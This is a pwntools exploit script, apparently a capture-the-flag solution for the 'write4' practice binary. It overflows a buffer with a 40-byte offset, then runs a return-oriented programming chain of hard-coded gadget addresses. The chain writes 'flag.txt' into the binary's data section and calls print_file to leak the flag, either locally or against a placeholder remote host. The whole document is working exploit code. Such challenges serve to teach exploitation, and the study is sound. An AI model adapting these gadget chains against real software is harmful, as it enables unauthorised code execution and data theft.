#!/usr/bin/env python3

from pwn import *

exe = ELF("write4_patched")
libc = ELF("libwrite4.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    offset = 40
    printfile = 0x00400510
    datasec = 0x00601028
    movgad = 0x400628
    poprdigad = 0x400693
    popgad = 0x400690

    payload = flat(b'A'*offset, popgad, datasec, b'flag.txt', movgad, poprdigad, datasec, printfile)

    r.sendlineafter(b'>', payload)
    r.recvuntil('you!\n')
    flag = r.recvline()
    print(flag)

if __name__ == "__main__":
    main()
